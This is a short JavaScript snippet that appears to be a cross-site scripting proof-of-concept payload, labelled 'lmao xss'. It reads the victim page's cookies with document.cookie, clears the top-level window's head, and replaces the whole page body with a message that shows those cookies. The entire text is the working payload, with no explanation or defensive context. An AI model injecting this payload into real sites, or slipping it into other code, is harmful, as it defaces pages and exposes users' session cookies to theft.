let outer = document.createElement('div');
let lmao = document.createElement('p');
lmao.textContent = 'lmao xss';
outer.appendChild(lmao);
let cookies = document.createElement('p');
cookies.textContent = 'cookies: ' + document.cookie;
outer.appendChild(cookies);
window.top.document.head.innerHTML = '';
window.top.document.body.innerHTML = outer.innerHTML;
